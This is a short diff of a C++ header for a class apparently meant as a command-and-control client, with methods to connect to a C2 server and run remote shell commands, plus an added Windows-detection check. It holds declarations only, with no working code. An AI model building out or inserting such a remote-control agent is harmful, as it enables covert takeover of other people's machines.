@@ -5,15 +5,12 @@
 
 class ABCsync {
 public:
-    // Connect to the C2 server
     bool connectToC2(const std::string& c2Address, int port);
-
-    // Execute the remote shell command
     bool executeRemoteCommand(const std::string& command);
 
 private:
-    // Helper function to establish a connection and handle command execution
     bool executeCommand(const std::string& command);
+    bool isWindows();  // New function to detect if running on Windows
 };
 
-#endif
+#endif // ABCSYNC_H
